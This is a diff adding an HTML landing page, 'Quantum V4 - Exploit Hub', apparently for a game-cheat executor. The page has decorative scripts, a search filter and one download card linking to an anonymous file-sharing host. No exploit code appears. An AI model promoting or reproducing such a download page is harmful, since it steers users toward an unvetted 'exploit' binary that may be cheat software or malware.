@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum V4 - Exploit Hub</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+</head>
+<body class="bg-[#0a0a0a] text-gray-100 overflow-x-hidden">
+    <div id="particles" class="fixed inset-0 -z-10 opacity-20"></div>
+
+    <div id="loading" class="fixed inset-0 bg-black flex items-center justify-center z-50">
+        <div class="cyber-loader"></div>
+    </div>
+
+    <div class="bg-red-600/90 text-center p-2 backdrop-blur-md" data-aos="fade-down">
+        <p class="text-sm font-mono">⚠️ You are about to use best Exploit [Internal]</p>
+    </div>
+
+    <nav class="sticky top-0 bg-gray-900/80 backdrop-blur-xl border-b border-gray-800/50 shadow-2xl" data-aos="fade-down">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <a href="#" class="text-2xl font-bold text-blue-400 hover:text-blue-300 transition-all duration-300 hover:drop-shadow-[0_0_15px_rgba(96,165,250,0.5)]">
+                <span class="text-cyan-400 glitch" data-text="QuantumV4">QuantumV4</span>
+            </a>
+            <div class="hidden md:flex space-x-8">
+                <a href="#" class="group hover:text-blue-400 transition-all duration-300">
+                    <span class="mr-2 opacity-70 group-hover:opacity-100">#</span>Exploits
+                    <div class="h-[2px] bg-blue-400 w-0 group-hover:w-full transition-all duration-300"></div>
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="relative py-32">
+        <div class="container mx-auto px-4 text-center" data-aos="zoom-in">
+            <h1 class="text-5xl md:text-7xl font-bold mb-6 bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">
+                <span class="text-shadow-[0_0_20px_rgba(96,165,250,0.5)] cyber-glitch">Quantum V4</span>
+            </h1>
+            <p class="text-gray-400 text-xl mb-8 max-w-3xl mx-auto font-mono terminal-text">
+                > Injecting...[OK]
+            </p>
+            
+            <!-- Search Bar -->
+            <div class="max-w-2xl mx-auto mb-12" data-aos="fade-up">
+                <div class="flex rounded-xl bg-gray-900/50 border border-gray-800 backdrop-blur-lg transition-all duration-300 hover:border-blue-400/50"
+                     id="search-container">
+                    <input type="text" 
+                           id="search-input"
+                           class="flex-1 bg-transparent px-6 py-4 outline-none font-mono placeholder-gray-500"
+                           placeholder="> Search Exploit">
+                    <button class="px-8 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 transition-all duration-300 rounded-r-xl"
+                            onclick="handleSearch()">
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-4 py-12">
+        <section class="mb-16">
+            <div class="grid gap-8 md:grid-cols-2 lg:grid-cols-3" id="exploit-grid">
+                <div class="exploit-card quantum-item">
+                    <div class="relative bg-gray-900/50 rounded-xl p-6 border border-gray-800/50 backdrop-blur-lg hover:border-cyan-400/30 transition-all duration-300 cursor-pointer">
+                        <div class="absolute inset-0 bg-gradient-to-r from-blue-500/10 to-cyan-500/10 opacity-0 hover:opacity-100 transition-all duration-300 rounded-xl"></div>
+                        <div class="relative">
+                            <div class="flex justify-between items-start mb-4">
+                                <span class="bg-red-500/20 text-red-400 px-3 py-1 rounded-full text-xs font-mono">CVE-2025-QUANTUM</span>
+                                <span class="text-gray-400 text-sm font-mono">v4.6.0</span>
+                            </div>
+                            <h3 class="font-bold text-lg mb-2 font-mono">Quantum X</h3>
+                            <p class="text-gray-400 text-sm mb-4 font-mono">Quantum vulnerability package</p>
+                            <div class="flex justify-between items-center">
+                                <a href="https://gofile.io/d/lXoBUv" 
+                                   class="download-btn bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 px-4 py-2 rounded-lg transition-all duration-300 flex items-center gap-2"
+                                   target="_blank">
+                                    <i class="fas fa-download"></i>
+                                    <span class="font-mono">DOWNLOAD</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="no-results" class="hidden text-center text-gray-500 font-mono py-12">
+                > No Quantum-related exploits found...
+            </div>
+        </section>
+    </main>
+
+    <script>
+        AOS.init({
+            duration: 1000,
+            once: false,
+            easing: 'ease-in-out-quad'
+        });
+
+        function handleSearch() {
+            const searchTerm = document.getElementById('search-input').value.toLowerCase();
+            const items = document.querySelectorAll('.quantum-item');
+            let hasResults = false;
+
+            items.forEach(item => {
+                const title = item.querySelector('h3').textContent.toLowerCase();
+                if (title.includes(searchTerm)) {
+                    item.style.display = 'block';
+                    hasResults = true;
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+
+            document.getElementById('no-results').style.display = hasResults ? 'none' : 'block';
+        }
+
+        const terminalText = document.querySelector('.terminal-text');
+        const originalText = "> Adding 100 UNC and 100 sUNC...[OK]";
+        let charIndex = 0;
+
+        function typeText() {
+            if (charIndex < originalText.length) {
+                terminalText.textContent += originalText.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeText, 50);
+            }
+        }
+        typeText();
+
+        function randomGlitch() {
+            const glitchElements = document.querySelectorAll('.glitch');
+            glitchElements.forEach(element => {
+                element.style.transform = `translate(${Math.random() * 4 - 2}px, ${Math.random() * 4 - 2}px)`;
+            });
+            setTimeout(randomGlitch, 50);
+        }
+        randomGlitch();
+
+        function initParticles() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.getElementById('particles').appendChild(renderer.domElement);
+
+            const geometry = new THREE.BufferGeometry();
+            const vertices = [];
+            for (let i = 0; i < 5000; i++) {
+                vertices.push(
+                    Math.random() * 2000 - 1000,
+                    Math.random() * 2000 - 1000,
+                    Math.random() * 2000 - 1000
+                );
+            }
+            geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
+            
+            const material = new THREE.PointsMaterial({
+                size: 2,
+                color: 0x3b82f6,
+                transparent: true,
+                opacity: 0.5
+            });
+
+            const particles = new THREE.Points(geometry, material);
+            scene.add(particles);
+            camera.position.z = 1000;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                particles.rotation.x += 0.0001;
+                particles.rotation.y += 0.0001;
+                renderer.render(scene, camera);
+            }
+            animate();
+        }
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            document.getElementById('loading').style.display = 'none';
+            initParticles();
+        });
+    </script>
+
+    <style>
+        .cyber-loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #3b82f6;
+            position: relative;
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+
+        .glitch {
+            position: relative;
+        }
+        .glitch::before {
+            content: attr(data-text);
+            position: absolute;
+            left: -2px;
+            text-shadow: 2px 0 #ff0000;
+            animation: glitch-anim 2s infinite linear alternate-reverse;
+            opacity: 0.8;
+        }
+
+        @keyframes glitch-anim {
+            0% { clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%); }
+            100% { clip-path: polygon(0 95%, 100% 95%, 100% 98%, 0 98%); }
+        }
+    </style>
+</body>
+</html>
